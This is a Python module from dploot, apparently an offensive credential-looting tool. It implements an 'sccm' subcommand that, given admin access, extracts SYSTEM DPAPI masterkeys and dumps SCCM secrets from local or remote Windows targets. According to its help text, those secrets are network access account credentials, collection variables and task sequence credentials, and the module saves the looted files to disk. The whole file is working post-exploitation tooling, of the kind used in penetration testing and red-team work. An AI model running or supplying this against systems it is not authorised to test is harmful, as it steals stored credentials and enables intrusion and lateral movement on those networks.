import argparse
import logging
from typing import Callable, Tuple

from dploot.action import DPLootAction
from dploot.lib.target import add_target_argument_group
from dploot.lib.utils import dump_looted_files_to_disk
from dploot.triage.masterkeys import MasterkeysTriage
from dploot.triage.sccm import SCCMTriage

NAME = "sccm"


class SCCMAction(DPLootAction):
    def __init__(self, options: argparse.Namespace) -> None:
        super().init_triage_generic(options)

    def run(self) -> None:
        super().run()
        if self.conn.is_admin():
            if self.masterkeys is None:

                def masterkey_triage(masterkey):
                    masterkey.dump()

                masterkeytriage = MasterkeysTriage(
                    target=self.target,
                    conn=self.conn,
                    per_masterkey_callback=masterkey_triage
                    if not self.options.quiet
                    else None,
                )
                logging.info("Triage SYSTEM masterkeys\n")
                self.masterkeys = masterkeytriage.triage_system_masterkeys()
                print()
                if self.outputdir is not None:
                    dump_looted_files_to_disk(self.outputdir, masterkeytriage.looted_files)

            def secret_callback(secret):
                if self.options.quiet:
                    secret.dump_quiet()
                else:
                    secret.dump()

            triage = SCCMTriage(
                target=self.target,
                conn=self.conn,
                masterkeys=self.masterkeys,
                per_secret_callback=secret_callback,
            )
            logging.info("Triage SCCM Secrets\n")
            triage.triage_sccm()
            if self.outputdir is not None:
                dump_looted_files_to_disk(self.outputdir, triage.looted_files)
        else:
            logging.info("Not an admin, exiting...")

def entry(options: argparse.Namespace) -> None:
    a = SCCMAction(options)
    a.run()

def add_subparser(subparsers: argparse._SubParsersAction) -> Tuple[str, Callable]:
    subparser = subparsers.add_parser(
        NAME,
        help="Dump SCCM secrets (NAA, Collection variables, tasks sequences credentials)  from local or remote target",
    )

    group = subparser.add_argument_group("sccm options")

    group.add_argument(
        "-mkfile",
        action="store",
        help=("File containing {GUID}:SHA1 masterkeys mappings"),
    )

    group.add_argument(
        "-wmi",
        action="store_true",
        help=("Dump SCCM secrets from WMI requests results"),
    )

    add_target_argument_group(subparser)

    return NAME, entry
